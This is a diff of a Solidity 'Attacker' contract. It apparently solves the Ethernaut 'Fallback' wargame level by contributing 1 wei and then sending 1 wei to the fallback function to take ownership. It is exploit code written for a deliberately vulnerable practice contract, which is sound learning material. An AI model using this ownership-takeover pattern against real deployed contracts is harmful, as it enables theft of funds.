@@ -3,15 +3,19 @@ pragma solidity ^0.8.0;
 
 import "../src/level01.sol";
 
-
 contract Attacker
 {
-    Fallback level01 = Fallback(payable(address(0x8da2eDCc38441696FccA95cE63BCb24850916807)));
-
-    function test() external
+    Fallback level;
+    constructor(address _level) payable
     {
-        level01.contribute{value: 1 wei}();
-        payable(address(level01)).call{value: 1 wei}("");
-        level01.withdraw();
+        level = Fallback(payable(_level));
     }
+
+    function exploit() external
+    {
+        level.contribute{value: 1 wei}();
+        (bool success, ) = payable(address(level)).call{value: 1 wei}("");
+        require(success, "NE VISHLO");
+    }
+    receive() external payable {}
 }
